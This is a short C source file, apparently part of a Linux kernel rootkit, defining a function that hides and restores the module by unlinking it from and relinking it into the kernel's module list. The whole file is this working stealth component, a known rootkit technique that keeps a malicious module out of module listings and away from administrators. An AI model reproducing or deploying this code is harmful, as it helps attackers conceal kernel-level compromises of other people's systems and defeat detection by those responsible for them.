#include "../include_modules/hide.h"
#include "../include/core.h"

static struct list_head *prev_module;
static short hidden = 0;
void toggleRkView(void) {
    if (hidden == 1) {
        list_add(&THIS_MODULE->list, prev_module);
        hidden = 0;

    } else {
        prev_module = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        hidden = 1;
    }
}
